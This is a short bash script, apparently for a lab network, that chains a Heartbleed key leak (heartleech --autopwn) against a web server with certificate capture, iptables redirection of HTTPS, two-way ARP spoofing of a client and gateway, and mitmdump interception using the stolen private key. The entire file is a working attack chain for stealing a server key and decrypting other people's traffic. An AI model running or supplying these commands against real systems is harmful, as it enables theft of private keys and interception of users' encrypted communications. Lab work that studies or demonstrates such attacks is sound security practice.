#!/bin/bash
LEGIT_WEBSERVER=192.168.17.110
GATEWAY=192.168.16.1
CLIENT=192.168.16.109

# leak server private key
heartleech ${LEGIT_WEBSERVER} --autopwn > /root/legit_server.key

# get server certificate
echo | \
    openssl s_client -servername ${LEGIT_WEBSERVER} -connect ${LEGIT_WEBSERVER}:443 2>/dev/null | \
    openssl x509 -text | sed -n -e '/-----BEGIN CERTIFICATE-----/,$p' > /root/legit_cert.crt

# bind server private key & certificate
cat /root/legit_server.key /root/legit_cert.crt > /root/legit_server_bundle.pem

# enable IPv4 forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# forward HTTPS traffic to local proxy
iptables -A FORWARD --in-interface attacker-eth0 -j ACCEPT
iptables -t nat -A PREROUTING -i attacker-eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# start arp spoofing
nohup arpspoof -i attacker-eth0 -t ${CLIENT} ${GATEWAY} &
nohup arpspoof -i attacker-eth0 -t ${GATEWAY} ${CLIENT} &

# start mitmdump
mitmdump --mode transparent --ssl-insecure --cert *=/root/legit_server_bundle.pem -s /root/mitmpcap.py

